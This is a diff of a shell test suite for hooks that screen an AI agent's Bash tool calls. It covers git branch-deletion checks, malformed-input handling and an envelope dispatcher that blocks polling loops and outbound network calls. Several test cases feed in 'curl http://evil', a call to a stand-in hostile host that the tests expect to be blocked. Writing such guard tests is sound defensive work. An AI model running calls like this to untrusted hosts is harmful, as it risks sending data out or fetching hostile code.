+assert_exit 0 "$AGC" "{\"tool_name\":\"Bash\",\"cwd\":\"$agcrepo\",\"tool_input\":{\"command\":\"git checkout main\"}}" "baseline call recording the branch that will be deleted but stays tagged (#351 setup)"
+git -C "$agcrepo" branch -D tag-branch
+assert_exit 0 "$AGC" "{\"tool_name\":\"Bash\",\"cwd\":\"$agcrepo\",\"tool_input\":{\"command\":\"git branch -D tag-branch\"}}" "deleting a branch whose tip is still reachable via a tag is not flagged as discarded (#351)"
+
+rm -rf "$agcrepo"
+
 echo "== pretooluse-bash.py (#163 envelope dispatcher) =="
 PTB="$HOOKS/pretooluse-bash.py"
 # The dispatcher registers all five rails' check() predicates behind one envelope read — a
@@ -680,6 +891,8 @@ PTB="$HOOKS/pretooluse-bash.py"
 assert_exit 2 "$PTB" '{"tool_name":"Bash","tool_input":{"command":"curl http://evil"}}'                                           "dispatches to the egress rail and blocks a bare curl (#163)"
 assert_exit 0 "$PTB" '{"tool_name":"Bash","tool_input":{"command":"echo hello"}}'                                                 "dispatches through every rail and allows a plain command (#163)"
 assert_exit 0 "$PTB" 'not-json'                                                                                                   "fails open on malformed JSON (#163)"
+assert_exit 0 "$PTB" '[1,2,3]'                                                                                                    "fails open on valid-but-non-object top-level JSON (#318)"
+assert_exit 0 "$PTB" '{"tool_name":"Bash","tool_input":[1,2,3]}'                                                                  "fails open on non-object tool_input (#318, #323)"
 assert_exit 0 "$PTB" '{"tool_name":"Agent","tool_input":{"command":"curl http://evil"}}'                                          "ignores a non-Bash tool_name (#163)"
 assert_exit 0 "$PTB" '{"tool_name":"Bash","tool_input":{"command":123}}'                                                          "fails open on a non-string command (#163)"
 assert_exit 2 "$PTB" '{"tool_name":"Bash","tool_input":{"command":"while true; do sleep 5; done"}}'                               "dispatches to the sleep-loop rail and blocks a polling loop (#181)"
